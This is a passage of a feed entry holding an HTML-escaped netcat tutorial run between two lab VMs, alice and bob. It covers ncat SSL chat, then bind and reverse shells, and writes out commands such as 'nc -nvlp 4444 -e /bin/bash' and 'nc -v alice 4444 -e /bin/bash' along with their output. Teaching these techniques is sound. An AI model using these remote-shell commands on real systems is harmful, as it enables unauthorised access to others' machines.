+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;ncat&lt;span class="w"&gt; &lt;/span&gt;--ssl&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Version 6.40 ( http://nmap.org/ncat )&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: SSL connection to 192.168.33.210:4444.&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB&lt;/span&gt;
+&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="remote-shell"&gt;Remote shell&lt;/h2&gt;
+&lt;p&gt;Traditional netcat and &lt;code&gt;ncat&lt;/code&gt; both provide the &lt;code&gt;-c&lt;/code&gt; and &lt;code&gt;-e&lt;/code&gt; options&lt;sup id="sf-netcat-basics-1-back"&gt;&lt;a href="#sf-netcat-basics-1" class="simple-footnote" title="It's possible to simulate these options in OpenBSD's netcat by using named pipes."&gt;1&lt;/a&gt;&lt;/sup&gt;, which lets you execute a program or a shell command after the connection.
+It can be a very dangerous option if you don't know what you're doing, and was actually called &lt;code&gt;GAPING_SECURITY_HOLE&lt;/code&gt; at some point in &lt;a href="http://sourceforge.net/p/netcat/code/HEAD/tree/tags/netcat-0.2.2/src/netcat.c#l271"&gt;traditional netcat's source code&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This can be used to run a &lt;a href="https://nmap.org/ncat/guide/ncat-tricks.html#ncat-httpserv"&gt;simple web server&lt;/a&gt; for example, but the case that interests us is the execution of remote shells. This topic can go really deep, but here is a quick primer.&lt;/p&gt;
+&lt;h3 id="bind-shell"&gt;Bind shell&lt;/h3&gt;
+&lt;p&gt;A bind shell is when the shell is executed on the server/listener.
+The remote attacker can then simply connect to the port to receive the shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-e&lt;span class="w"&gt; &lt;/span&gt;/bin/bash
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 60146&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;hostname&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;alice&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, &lt;code&gt;bob&lt;/code&gt; is the attacker. He connected to &lt;code&gt;alice&lt;/code&gt; on port 4444 and was able to execute the &lt;code&gt;hostname&lt;/code&gt; command.&lt;/p&gt;
+&lt;h3 id="reverse-shell"&gt;Reverse shell&lt;/h3&gt;
+&lt;p&gt;As its name implies, a reverse shell is executed on the other side.
+The attacker starts its listener, then waits for the victim to send its shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 35428&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;hostname&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;bob&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-e&lt;span class="w"&gt; &lt;/span&gt;/bin/bash
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, &lt;code&gt;alice&lt;/code&gt; is the attacker. She started her listener and received the shell from &lt;code&gt;bob&lt;/code&gt;, allowing her to run the &lt;code&gt;hostname&lt;/code&gt; command.&lt;/p&gt;&lt;ol class="simple-footnotes"&gt;&lt;li id="sf-netcat-basics-1"&gt;It's possible to simulate these options in OpenBSD's netcat &lt;a href="https://superuser.com/a/691043"&gt;by using named pipes&lt;/a&gt;. &lt;a href="#sf-netcat-basics-1-back" class="simple-footnote-back"&gt;↩︎&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;</content><category term="Cybersecurity"></category><category term="netcat"></category><category term="vagrant"></category></entry></feed>
